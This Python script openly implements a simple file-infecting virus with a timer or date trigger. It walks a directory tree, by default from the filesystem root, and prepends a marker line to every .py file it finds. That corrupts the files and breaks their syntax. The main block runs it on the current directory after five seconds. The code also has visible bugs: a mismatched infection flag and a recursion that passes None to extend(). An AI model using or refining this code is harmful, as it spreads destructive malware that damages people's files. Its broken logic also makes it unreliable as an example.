import os
import datetime
import pathlib
import time

class Virus:
    
    def __init__(self, infect_string=None, path=None, \
                             extension=None, target_file_list=None):
        if isinstance(infect_string, type(None)):
            self.infect_string = "I am a Virus"
        else:
            self.infect_string = infect_string

        self.path = "/" if isinstance(path, type(None)) else path
        self.extension = ".py" if isinstance(extension, type(None)) else extension
        if isinstance(target_file_list, type(None)):
            self.target_file_list = []
        else:
            self.target_file_list = target_file_list
            
            
            
    def list_files(self, path):
        files_in_current_directory = os.listdir(path)

        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                # check the extension
                file_extension = pathlib.Path(absolute_path).suffix

                if os.path.isdir(absolute_path):
                    self.target_file_list.extend(self.list_files(absolute_path))

                elif file_extension == self.extension:
                    is_infected = False
                    with open(absolute_path) as f:
                        for line in f:
                            if self.infect_string in line:
                                self.is_infected = True
                                break
                    if not is_infected:
                        self.target_file_list.append(absolute_path)
            
            
    def infect(self, file_abs_path):
        if os.path.basename(file_abs_path) != "virus.py":
            try:
                with open(file_abs_path, 'r') as f:
                    data = f.read()
                with open(file_abs_path, 'w') as virus:
                    virus.write(self.infect_string + "\n" + data )
            except Exception as e:
                print(e)
        
        
    def start_virus_infections(self, timer=None, target_date=None):
        if not isinstance(timer, type(None)):
            time.sleep(timer)
            self.list_files(self.path)
            for target in self.target_file_list:
                self.infect(target)

        elif not isinstance(target_date, type(None)):
            today = str(datetime.datetime.now())[:10]
            if str(target_date) == today:
                self.list_files(self.path)
                for target in self.target_file_list:
                    self.infect(target)

        else:
            print("User must provide either a timer or a date using datetime.date()")
            
            
            
if __name__ == "__main__":
    current_directory = os.path.abspath("")
    virus = Virus(path=current_directory)
    # virus.start_virus_infections(target_date=datetime.date(2021,6,1))
    virus.start_virus_infections(timer=5)
    # print(virus.target_file_list)
